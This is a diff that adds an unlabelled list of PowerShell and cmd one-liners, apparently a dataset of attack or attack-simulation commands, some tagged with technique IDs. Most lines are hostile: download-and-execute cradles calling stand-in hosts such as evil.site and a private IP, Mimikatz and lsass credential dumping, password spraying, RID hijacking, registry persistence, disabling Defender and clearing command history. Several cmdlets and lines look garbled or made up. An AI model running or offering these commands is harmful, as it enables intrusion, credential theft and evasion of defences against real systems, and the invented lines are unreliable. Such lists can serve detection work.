@@ -1,0 +1,113 @@
+$code = 'IEX (New-Object Net.WebClient).DownloadString('https://evil.site/evil_code.ps1')'; Invoke-Expression $code
+powershell.exe -exec bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.url/evilCode.ps1')"
+Get-LocalGroupMember -Identity "Administrators" -Recurse | ? { $_.MemberName -like "*$" }
+Invoke-Expression -Command "Invoke-Mimikatz -DumpCreds"
+powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest http://malicious.site/malicious_script.ps1 | Invoke-Expression"
+iex(new-object net.webclient).downloadstring('http://ghithub.com/badProject')
+Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious-git.com/malicious-script.ps1')"
+IEX (New-Object Net.WebClient).DownloadString('http://dangerExample.com/Kern132.ps1')
+Get-BrowserInformation -Browser All -Datatype History -UserName Alice -SearchStrings 'twitter'
+Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\administrator | Format-Table name
+Invoke-RIDHijacking -UseGuest -RID 1001
+Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.com/example.ps1')"
+Invoke-Inbox -FilePath ${file_path} -OutFilePath ${output_file} -Execute -ErrorAction Stop
+ping ${ip_address}
+Invoke-Expression -Command "& { [Script Block] }"
+Import-Module .\powerview.ps1; ; Get-Domain | ConvertTo-Json -Depth 1
+certutil -addstore my ${priv_store}
+import-module "$env:temp\MSOLSpray.ps1" ; Invoke-MSOLSpray -UserList "${UserList}" -Password "${pwd}"
+Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.com/example.ps1')"
+Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=${uac_prop})' -Server ${domain}
+Get-Process lsass | Out-Minidump
+copy-item -Path "\${remote}\C$${ShareFile}" -Destination "$Env:TEMP${LocalFile}"
+get-ChildItem ${log_file} | % { $_.Content }
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://example.com/script.ps1')"
+wmic /NAMESPACE:\root\SecurityCenter2 PATH AntiVirusProduct GET /value
+powershell.exe -nop -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/malicious_script.ps1')"
+Get-ChildItem -Path ${file_path} -Recurse | Select-String -Pattern "pass"
+Start-Process -FilePath "powershell.exe" -ArgumentList '-NoP -sta -w 1 -enc [encoded command]'
+Connect-MailMessage -From ${sender_user} -To ${receiver_user} -Subject "T1048.003 Atomic Test" -Attachments ${inputF} -SmtpServer ${SMTPsrv}
+Connect-MailMessage -From ${sender_user} -To ${receiver_user} -Subject "T1048.003 Atomic Test" -Attachments ${inputF} -SmtpServer ${SMTPsrv}
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command "Invoke-WebRequest http://www.somewhere.com/hello.ps1 -OutFile hello.ps1; .\hello.ps1"
+Start-Process -FilePath "powershell.exe" -ArgumentList '-NoP -sta -w 1 -enc [encoded command]'
+powershell.exe -ExecutionPolicy Bypass -NoProfile -File script.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://malicious-url.com/malicious-script.ps1' | Invoke-Expression"
+New-Directory -Path ${folder} -Force
+Get-System
+Out-Minidump -Process (Get-Process -Id 4274)
+Invoke-Expression -Command "Invoke-WebRequest http://malicious.site/malicious_script.ps1 | Invoke-Expression"
+Invoke-Shellcode
+Start-Process ${parent_pid} -ArgumentList '-NoP -sta -w 1 -enc [encoded command]'
+[System.Text.Encoding]::Unicode.GetCurrentDateTime()
+$ElevatedOptions = New-ElevatedPersistenceOption -Registry -AtStartup
+Send-MailMessage -From ${sender} -To ${receiver} -Subject "T1048.003 Atomic Test" -Attachments ${input_file} -SmtpServer ${smtp_server}
+Invoke-Inveigh -IP 192.168.1.10 -HTTP N
+Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, ${binary}" -Force
+Invoke-Item -Path 'http://malicious.site/malicious_script.ps1' -Destination 'C:\malicious_script.ps1'; Invoke-Expression 'C:\malicious_script.ps1'
+$path = "C:\Windows\System32\cmd.exe /c "for /l %x in (1,1,${max_to_print}) do start wordpad.exe /p ${file_to_print}" | out-null
+Import-Module .\Inveigh.ps1; ; Invoke-Inveigh -ModuleName 'ModuleName' -ModulePath 'ModulePath'
+Invoke-Nightmare -DumpCreds
+cmd.exe /c "${local_folder}\${local_executable}" kerberoast ${flags} /outfile:"${local_folder}\${out_file}"
+Invoke-Command -ComputerName <RemoteSystem> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://maliciousdomain.com/malicious.ps')}
+Invoke-DomainPasswordSpray -UsernameList 'Username1' -Password 'Password1' -OutFile 'C:\temp\ps1_0.txt'
+Send-Message -From ${sender_user} -To ${receiver_user} -Subject "T1048.003 Atomic Test" -Attachments ${inputF} -SmtpServer ${SMTPsrv}
+Enable-Eventlog Security; ; Add-Eventlog Security; ; Add-Eventlog Command;
+Invoke-Command -ComputerName <remote_host> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://exploit.com/hack_script.ps1')}
+cscript ${vbscript} > $env:TEMP\T1059.005.out.txt
+Start-Process ${AA_Path}
+Invoke-WebRequest -Uri ${ipAddress} -Method POST -Body ${filePath}
+Rubeus.exe userenum -d ${Domain} --dc ${DomainController} -d ${ResultFile}
+New-User -Name "${username}" -GroupName "Administrators" -Domain my.domain.local
+Get-GPPPassword -Verbose
+powershell.exe -EncodedCommand AlABAAgAEQAQABEAGgAeAB8AHwAiACMAJgAqAC4AMAAxADUAPgBFAEkATgBUAFYAW
+Invoke-Command -ComputerName <RemoteComputer> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://maliciousdomain.com/maliciousscript.ps1')}
+sleep 60
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://malicious-url.com/malicious-script.ps1' | Invoke-Expression"
+Start-Process ${Remote_Process_Path}
+Invoke-Expression -Command "wifi.ps1"
+whoami
+Get-BrowserInformation -Browser All -Datatype History -UserName user1 -SearchStrings '*$'
+Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://heavy-exploit.site/evilexample.ps1')"
+Get-NetUser -properties name , pwdlastset , logoncount , badpwdcount #Get all pwdlastset, logoncount and badpwdcount
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-url')"
+Invoke-GPG -Path 'C:\windows\psdrt\psdrt.dit' -RemoteDestination 'c:\windows\temp\psdrt.dit' -ComputerName 'Server1'
+cd $env:temp ; .\kerbrute.exe userenum -d ${domain} --dc ${domaincontroller} $env:TEMP\username.txt
+odbc.exe ${InputFile} ${OutputFile}
+$imewdbled = New-Object System.Net.WebClient; $imewdbled.DownloadString('http://malicious-site.com/malicious-code')
+Import-Module .\powerview.ps1; ; Get-NetComputer
+$BO = New-Object System.Net.WebClient; $BO.DownloadString('http://malicious_site.com/malicious_script.ps1')
+Get-Service ; Get-EnvironmentVariable -Process
+nbtstat -A ${remote.host.ip}
+New-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -Value "${cmd}" -PropertyType "String"
+Invoke-Command -ComputerName [IP Address] -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://[malicious website]/malicious.ps1')}
+PathToAtomicsFolder\T1027.006\bin\T1027_006_remote.html
+Invoke-ResourceSidHijacking -User Joe -RID 500 -Password Password1
+Invoke-Command -ComputerName <target_host> -ScriptBlock { <malicious_code> }
+Get-DomainUser -AdminSDHolder | select samaccountname , description , pwdlastset , logoncount , badpwdcount
+Import-Module .\PSCredentialManager.ps1 -Force; ; Get-VaultCredential
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'
+Get-ForestDomain
+Get-OperatingSystem | select * | more
+gci c:\ -Include *.xml,*.txt,*.bat,*.ps1,*.psm,*.psd -Recurse -EA SilentlyContinue | select-string password; exit 0;
+Get-RemoteLocalAccountHash -ComputerName < remotehost> -Verbose
+Get-DomainGPOUserLocalGroupMapping -Identity "External Admins" | select ms-Mcs-AdmPwdExpirationTime
+Invoke-Shellcode -Command "reconvert" -ServiceName Updater32
+Get-SQLInstanceDomain | Get-SQLConnectionTest -Verbose
+Get-WmiObject -Class Win32_Process
+Set-PSReadlineOption -HistorySaveStyle SaveNothing
+Add-MonitoringFile -Path 'C:\temp\file.txt' -RemoteDestination 'c:\temp\file.txt' -ComputerName 'Server1'
+Get-SQLServerExtendedProperties -Verbose -Instance "dcorp-mssql"
+$ps = Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'
+Get-SQLInstanceLinkCrawl -InstanceName 'dcorp-mssql' -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'
+Get-ScheduledTask -Filter 'UserAccountControl -band 4194304' -Properties 'SamAccountName,lastlogon'
+Set-MpPreference -DisableRealtimeMonitoring 1 ; Set-MpPreference -DisableBehaviorMonitoring 1 ; Set-MpPreference -DisableScriptScanning 1 ; Set-MpPreference -DisableBlockAtFirstSeen 1
+Get-BrowserInformation -Browser All -Datatype SaveToFile -NoProfile -File ${output_file}
+Get-WmiObject -Class Win32_Process | select __Name , ProcessName , Id
+Get-ChromeBrowser -Browser All -Datatype Bookmarks -UserName Antonio -Search 'facebook'
+$imewdbled = [System.Text.Encoding]::Unicode.GetBytes('IyEvdXNyL')
+Get-VaultCredential
+Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'select * from openquery(""sql2.domain.io"", "select * from information_schema.tables")'
+Import-Module .\psadmin.ps1; ; Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious-script.ps1')"
+Start-Process ${script_path_to_start_script} ; Start-Process ${script_path_to_start_script}
+Get-WmiObject -Class Win32_Profile -Namespace root\directory\ldap
+Add-Type -TypeDefinition @" using System; using System.Runtime.InteropServices; public class MemoryReader { [DllImport("kernel32.dll")] public static extern bool ReadMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead); } "@ $process = Get-Process -Name 'process_name' $handle = $process.Handle
